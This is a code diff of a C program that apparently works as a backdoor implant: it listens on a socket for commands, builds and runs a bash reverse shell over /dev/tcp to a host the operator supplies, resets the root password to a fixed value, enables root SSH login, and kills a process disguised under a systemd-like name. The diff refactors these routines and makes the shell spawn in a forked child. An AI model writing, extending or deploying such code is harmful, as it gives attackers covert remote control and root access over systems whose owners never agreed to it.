@@ -18,16 +18,14 @@ void spawn_shell(void) {
     char *revshell1 = "/9001 0>&1'";
 
     strncpy(revshell, "bash -c 'bash -i >& /dev/tcp/", BUFFER_SIZE);
+    write(connfd, "-> ", 3);
     read(connfd, input, sizeof(input));
-
-    for (unsigned int i = 0; i <= strnlen(input, BUFFER_SIZE); i++) {
-        if (input[i] == '\n')
-            input[i] = '\0';
-    }
-
+    input[strcspn(input, "\n")] = 0;
     strncat(revshell, input, BUFFER_SIZE);
     strncat(revshell, revshell1, BUFFER_SIZE);
-    system(revshell);
+
+    if (fork() == 0)
+        system(revshell);
 }
 
 void enable_root_ssh(void) {
@@ -40,31 +38,29 @@ void read_data(void) {
 
     for (;;) { 
         bzero(input, BUFFER_SIZE);
+        write(connfd, "-> ", 3);
         read(connfd, input, sizeof(input));
-        write(connfd, "\0", 1);
         if (handler(input) == 1)
             raise(SIGINT);
     }
 }
 
 int handler(char option[BUFFER_SIZE]) {
-    if (strncmp(option, "exit\n", 5) == 0) {
+    if (strncmp(option, "exit\n", 5) == 0)
         return 1;
-    } else if (strncmp(option,"shell\n",6) == 0) {
-        if (fork()== 0)
-            spawn_shell();
-    } else if (strncmp(option,"kill\n",5) == 0) {
+    else if (strncmp(option,"shell\n",6) == 0)
+        spawn_shell();
+    else if (strncmp(option,"kill\n",5) == 0)
         system("pkill -9 systemd-daemon");
-    } else if (strncmp(option,"passwd\n",7) == 0) {
+    else if (strncmp(option,"passwd\n",7) == 0)
         system(" bash -c \"echo -e 'systemd-kit\nsystemd-kit\n' | passwd\"");
-    } else if (strncmp(option,"ssh\n",4) == 0) {
+    else if (strncmp(option,"ssh\n",4) == 0)
         enable_root_ssh();
-    }
 
     return 0;
 }
 
-void start_server(void) {
+void start_service(void) {
     int sockfd;
     unsigned int len; 
     struct sockaddr_in servaddr;
@@ -100,5 +96,5 @@ void start_server(void) {
 }
 
 int main(void) {
-    start_server();
+    start_service();
 }
